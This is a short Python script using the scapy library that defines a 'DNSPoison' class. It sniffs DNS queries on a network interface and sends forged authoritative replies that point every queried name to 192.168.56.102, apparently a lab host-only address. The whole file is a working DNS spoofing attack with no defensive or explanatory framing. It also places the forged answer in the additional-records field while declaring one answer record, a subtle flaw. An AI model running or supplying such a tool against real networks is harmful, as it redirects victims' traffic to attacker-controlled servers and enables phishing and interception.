#! /usr/bin/python

from scapy.all import *
# from scapy.layers.l2 import Ether, ARP
import sys



class DNSPoison: 

    interface = "enp0s3"
    ServerIP = "192.168.56.102"
    packet_filter = " and ".join([
        "udp dst port 53",          # Filter UDP port 53
        "udp[10] & 0x80 = 0",       # DNS queries only
        ])

    def dns_reply(self,pkt):
        # Construct the DNS packet
        # Construct the Ethernet header by looking at the sniffed packet
        eth = Ether(
            src=pkt[Ether].dst,
            dst=pkt[Ether].src
            )

        # Construct the IP header by looking at the sniffed packet
        ip = IP(
            src=pkt[IP].dst,
            dst=pkt[IP].src
            )

        # Construct the UDP header by looking at the sniffed packet
        udp = UDP(
            dport=pkt[UDP].sport,
            sport=pkt[UDP].dport
            )

        # Construct the DNS response by looking at the sniffed packet and manually
        dns = DNS(
            id=pkt[DNS].id,
            qd=pkt[DNS].qd,
            aa=1,
            rd=0,
            qr=1,
            qdcount=1,
            ancount=1,
            nscount=0,
            arcount=0,
            ar=DNSRR(
                rrname=pkt[DNS].qd.qname,
                type='A',
                ttl=600,
                rdata=self.ServerIP)
            )

        # Put the full packet together
        response_packet = eth / ip / udp / dns

        # Send the DNS response
        sendp(response_packet, iface=self.interface)

    def sniff(self):
        return sniff(prn=self.dns_reply, filter=self.packet_filter, store=0, iface = self.interface, count = 1)

        
		

